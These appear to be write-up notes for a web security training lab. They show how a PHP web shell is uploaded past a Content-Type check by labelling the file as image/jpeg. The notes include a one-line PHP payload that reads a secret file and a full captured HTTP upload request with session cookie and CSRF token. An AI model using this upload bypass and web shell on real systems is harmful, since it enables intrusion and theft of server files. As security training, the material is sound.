# Web shell upload via Content-Type restriction bypass

- This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types but relies on checking user-controllable input to verify this.
- To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.
- You can log in to your own account using the following credentials: `wiener:peter`

Payload used

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

```bash
POST /my-account/avatar HTTP/2
Host: 0a8500ce047f8ab68359cd1000b90045.web-security-academy.net
Cookie: session=SL9ZJqip5NrysHepEZhSEsEmNCZAjvGw
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundary4f9867fc0a53c23664bbab225ee3817
Content-Length: 516
Origin: https://0a8500ce047f8ab68359cd1000b90045.web-security-academy.net
Referer: https://0a8500ce047f8ab68359cd1000b90045.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

------geckoformboundary4f9867fc0a53c23664bbab225ee3817
Content-Disposition: form-data; name="avatar"; filename="rev2.jpeg" <=== "rev2.php"
Content-Type: image/jpeg

<?php echo file_get_contents('/home/carlos/secret'); ?>
------geckoformboundary4f9867fc0a53c23664bbab225ee3817
Content-Disposition: form-data; name="user"

wiener
------geckoformboundary4f9867fc0a53c23664bbab225ee3817
Content-Disposition: form-data; name="csrf"

438L63d35mCYUWjXA1tkJkVW2Trgy8OR
------geckoformboundary4f9867fc0a53c23664bbab225ee3817--

```

![image.png](Web%20shell%20upload%20via%20Content-Type%20restriction%20bypa/image.png)